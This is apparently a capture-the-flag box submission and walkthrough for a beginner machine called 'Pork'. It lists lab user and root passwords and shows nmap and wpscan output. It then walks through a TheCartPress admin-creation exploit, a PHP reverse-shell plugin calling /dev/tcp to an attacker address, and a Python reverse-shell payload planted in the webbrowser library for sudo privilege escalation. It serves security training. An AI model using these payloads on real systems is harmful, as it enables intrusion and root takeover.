# PORK

## Introduction

This box is designed for beginners, players will find misconfiguration of python library called Python Library Hijacking, some encrypted messages to train players about CTF and exploitable wordpress plugins.
I was very challenged to make this machine because I found some industries from my clients not paying attention to some of their server configurations and rarely patching applications that have issued certain CVEs. 

## Info for HTB

### Access

Passwords:

| User     | Password                            |
| ---------| ----------------------------------- |
| d3nt1    | l0v35u64r							 |
| parul14n | napinadar							 |
| root     | saksangnamargota					 |

### Key Processes

Apache Web Server
- Wordpress that points to the `pork.htb` link has a vulnerability to `TheCartPress Plugin V1.5.3.6` which allows attackers to gain wordpress admin access, and should not be updated.

Encrypted messages 
- `mine.bak` encrypted with NATO Phonetic Alphabet
- `.msgenc` enrypted with base64

Modifiable Python libraries 

### Automation / Crons

[N/A]

### Firewall Rules

Port `22` or SSH can only be accessed via user d3nt1

### Docker

[N/A]

### Other

[N/A]

## Writeup

## Enumeration

### Nmap
```
ports=$(nmap -p- --min-rate=1000 -T4 192.168.84.145 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 192.168.84.145
```

```
┌──(root💀kali)-[~]
└─# ports=$(nmap -p- --min-rate=1000 -T4 192.168.84.145 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 192.168.84.145
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-21 11:53 EDT
Nmap scan report for pork.htb (192.168.84.145)
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f7:93:f9:97:26:70:fb:42:78:70:f8:a5:31:ea:85:93 (RSA)
|   256 10:dd:23:db:3b:e3:b1:f7:39:bd:c2:ee:6c:0b:71:81 (ECDSA)
|_  256 9e:b2:34:47:e1:c7:73:1f:0c:4f:b5:36:e8:d8:e0:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: PORK FOR EVERYONE &#8211; Welcome!!!
MAC Address: 00:0C:29:7B:29:73 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
```

We find Apache and SSH running on their usual ports.

### Wordpress

Browsing to port 80 redirects us to pork.htb.
Add pork.htb to the hosts file and browse to it. We come across a website with Wordpress.

![img](https://github.com/btxcode/pork/blob/main/assets/1.png)

do a wordpress scan using wpscan to get information 

```                                                                                                                               
┌──(root💀kali)-[~]
└─# wpscan --url http://pork.htb
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://pork.htb/ [192.168.84.145]
[+] Started: Thu Oct 21 11:51:39 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://pork.htb/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] The external WP-Cron seems to be enabled: http://pork.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Latest, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://pork.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://pork.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://pork.htb/index.php/sample-page/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://pork.htb/wp-content/themes/twentytwentyone/
 | Latest Version: 1.4 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://pork.htb/wp-content/themes/twentytwentyone/readme.txt
 | Style URL: http://pork.htb/wp-content/themes/twentytwentyone/style.css?ver=1.4
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://pork.htb/wp-content/themes/twentytwentyone/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] thecartpress
 | Location: http://pork.htb/wp-content/plugins/thecartpress/
 | Latest Version: 1.5.3.6 (up to date)
 | Last Updated: 2017-01-12T19:25:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.5.3.6 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pork.htb/wp-content/plugins/thecartpress/readme.txt

[+] wp-security-hardening
 | Location: http://pork.htb/wp-content/plugins/wp-security-hardening/
 | Latest Version: 1.2.2 (up to date)
 | Last Updated: 2021-06-02T19:02:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://pork.htb/wp-content/plugins/wp-security-hardening/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Oct 21 11:51:43 2021
[+] Requests Done: 177
[+] Cached Requests: 5
[+] Data Sent: 50.529 KB
[+] Data Received: 451.011 KB
[+] Memory used: 215.66 MB
[+] Elapsed time: 00:00:03
```

### Foothold

Get information that Wordpress uses TheCartPress 1.5.3.6 Plugin, the exploit can be seen in [exploit-db](https://www.exploit-db.com/exploits/50378) 

After downloading it we can see several lines of information related to the exploit, then find the user and password to be created.

```
       data = {
        "tcp_new_user_name" : "admin_02",
        "tcp_new_user_pass" : "admin1234",
        "tcp_repeat_user_pass" : "admin1234",
        "tcp_new_user_email" : "test@test.com",
        "tcp_role" : "administrator"
        }
```

Run with `python3 epxloit.py http://pork.htb`

```
┌──(root💀kali)-[~/htb/pork]
└─# python3 exploit.py http://pork.htb                                                                             
TheCartPress <= 1.5.3.6 - Unauthenticated Privilege Escalation
Author -> space_hen (www.github.com/spacehen)
Inserting admin...
Success!
Now login at /wp-admin/
```

login to wordpress with the user and password created by the exploit 

![img](assets/2.PNG)

### Shell

make a plugin to get a shell, you can read about it [here](https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell) or you can use [pentestmonkey reverse shell php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

```
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: Vince Matteo
* Author URI: http://www.sevenlayers.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/[ipattacker]/[portattacker] 0>&1'");
?>
```

save with the name you want for example shell.php then archive it into a zip file.
upload the zip file in the plugin menu and activate it.

![img](assets/3.PNG)

## Lateral Movement

searched some important files and got mine.bak 

![img](assets/4.PNG)

decode using [dcode.fr](https://www.dcode.fr/alphabet-phonetique-otan) and get the following result

![img](assets/5.PNG)

use ssh to access user d3nt1

![img](assets/6.PNG)

found a hidden file named .msgenc , its contents are an encoded message.

![img](assets\7.PNG)

i used [cyberchef](https://gchq.github.io/CyberChef/) to decode the message and got the following result

```
Dear D3nt1

Im Sorry, I'm Sick right now.
can you help me?
please login to my account
my password is napinadar
please open the browser in your desktop to see
how big profit we sell.
```

After these messages we get a password that is `napinadar`, check the user with `cat /etc/passwd` and get the user `parul14n`
here we can get user.txt

![img](assets/8.PNG)

## Privilege Escalation

Check with ```sudo -l```

![img](assets/9.PNG)

User `parul14n` can access `python3.8` and `benefit.py` with sudo access without password.
Check the `benefit.py` file and we can see that it calls the python library `webbrowser`, we can't edit the file, but we can edit the `webbrowser.py` library

![img](assets/10.PNG)

After understanding a few lines of code add [payload](https://www.oreilly.com/library/view/hands-on-red-team/9781788995238/cd15b05d-822f-494d-939a-ae5a671222ff.xhtml) after the following line of code

```
def open(url, new=0, autoraise=True):
    """Display url using the default browser.

    If possible, open url in a location determined by new.
    - 0: the same browser window (the default).
    - 1: a new browser window.
    - 2: a new browser page ("tab").
    If possible, autoraise raises the window (the default) or not.
    """
	
    #PAYLOAD
    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ipattacker",portattacker));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
	
    if _tryorder is None:
        with _lock:
            if _tryorder is None:
                register_standard_browsers()
```

![img](assets/11.PNG)

Executing the commands `sudo /usr/bin/python3.8 /home/parul14n/Desktop/benefit.py` should give us a reverse shell as Root, after which the final flag can be accessed.

![img](assets/12.PNG)
